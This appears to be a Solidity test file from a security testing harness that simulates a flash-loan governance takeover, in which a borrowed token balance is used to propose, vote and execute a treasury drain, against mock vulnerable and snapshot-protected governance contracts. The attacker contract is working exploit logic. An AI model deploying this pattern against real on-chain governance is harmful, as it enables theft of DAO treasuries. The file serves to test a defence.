// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "./SentinelBase.t.sol";
import "../targets/mocks/MockGovToken.sol";
import "../targets/FlashLender.sol";
import "../targets/GovernanceVulnerable.sol";
import "../targets/GovernanceProtected.sol";

/// @notice Helper attacker contract executing flash loan vote hijacking
contract GovernanceAttacker is IFlashBorrower {
    bytes32 public constant CALLBACK_SUCCESS = keccak256("ERC3156FlashBorrower.onFlashLoan");

    MockGovToken public immutable govToken;
    FlashLender public immutable flashLender;
    address payable public immutable lootRecipient;

    constructor(address _govToken, address _flashLender, address payable _recipient) {
        govToken = MockGovToken(_govToken);
        flashLender = FlashLender(_flashLender);
        lootRecipient = _recipient;
    }

    function executeAttack(address targetGov, uint256 borrowAmount) external {
        bytes memory data = abi.encode(targetGov);
        flashLender.flashLoan(this, address(govToken), borrowAmount, data);
    }

    function _executeProposalVote(address targetGov) internal {
        // Step 1: Submit proposal to drain treasury ETH to lootRecipient
        (bool propOk, bytes memory propData) = targetGov.call(
            abi.encodeWithSignature("propose(address,uint256)", lootRecipient, 10 ether)
        );
        require(propOk, "Propose failed");
        uint256 proposalId = abi.decode(propData, (uint256));

        // Step 2: Cast vote using flash-loaned voting tokens
        (bool voteOk, bytes memory voteErr) = targetGov.call(
            abi.encodeWithSignature("castVote(uint256)", proposalId)
        );
        if (!voteOk) {
            assembly {
                revert(add(voteErr, 32), mload(voteErr))
            }
        }

        // Step 3: Execute proposal immediately
        (bool execOk, bytes memory execErr) = targetGov.call(
            abi.encodeWithSignature("execute(uint256)", proposalId)
        );
        if (!execOk) {
            assembly {
                revert(add(execErr, 32), mload(execErr))
            }
        }
    }

    function onFlashLoan(
        address,
        address,
        uint256 amount,
        uint256 fee,
        bytes calldata data
    ) external override returns (bytes32) {
        require(msg.sender == address(flashLender), "Unauthorized lender");
        address targetGov = abi.decode(data, (address));

        _executeProposalVote(targetGov);

        // Step 4: Repay flash loan principal + fee
        govToken.transfer(address(flashLender), amount + fee);

        return CALLBACK_SUCCESS;
    }

    receive() external payable {}
}

/// @title Governance Takeover Simulation
/// @notice Simulates flash-loan vote hijacking against live-balance vs snapshot-based governance.
contract GovernanceTest is SentinelBase {
    MockGovToken public govToken;
    FlashLender public flashLender;

    function setUp() public {
        // Roll block number past genesis so block.number - 1 is valid
        vm.roll(100);

        govToken = new MockGovToken("Sentinel Governance Token", "SGT");
        flashLender = new FlashLender();

        // Honest DAO participants hold 50,000 SGT minted at block 50
        vm.roll(50);
        govToken.mint(honestUser, 50_000 ether);

        // Flash lender is supplied with 150,000 SGT (enough to meet 100,000 quorum)
        govToken.mint(address(flashLender), 150_000 ether);

        vm.roll(100);
    }

    function test_governance() public {
        string memory variant = getVariant();
        bool isProtected = keccak256(bytes(variant)) == keccak256(bytes("protected"));

        address govAddress;
        if (isProtected) {
            GovernanceProtected protectedGov = new GovernanceProtected(address(govToken));
            vm.deal(address(protectedGov), 10 ether);
            govAddress = address(protectedGov);
        } else {
            GovernanceVulnerable vulnGov = new GovernanceVulnerable(address(govToken));
            vm.deal(address(vulnGov), 10 ether);
            govAddress = address(vulnGov);
        }

        // Attacker starts with 0 ETH and has tokens to cover the flash loan fee
        vm.deal(attacker, 0 ether);
        govToken.mint(attacker, 500 ether); // seed buffer for flash fee
        uint256 attackerEthBefore = attacker.balance;

        vm.startPrank(attacker);
        GovernanceAttacker attackContract = new GovernanceAttacker(
            address(govToken),
            address(flashLender),
            attacker
        );
        // Transfer fee reserve to attacker contract
        govToken.transfer(address(attackContract), 500 ether);

        bool attackSucceeded = false;
        string memory note;

        // Attacker borrows 120,000 SGT via flash loan to hijack vote
        try attackContract.executeAttack(govAddress, 120_000 ether) {
            uint256 attackerEthAfter = attacker.balance;
            if (attackerEthAfter > attackerEthBefore) {
                attackSucceeded = true;
                note = "hijacked vote with flash-loaned balance and drained treasury";
            } else {
                note = "vote passed but treasury was not drained";
            }
        } catch Error(string memory reason) {
            note = string.concat("governance takeover blocked: ", reason);
        } catch (bytes memory) {
            note = "governance takeover blocked by snapshot check";
        }
        vm.stopPrank();

        uint256 netProfit = 0;
        if (attacker.balance > attackerEthBefore) {
            netProfit = attacker.balance - attackerEthBefore;
        }

        emitSentinelResult("governance", variant, attackSucceeded, netProfit, note);
    }
}
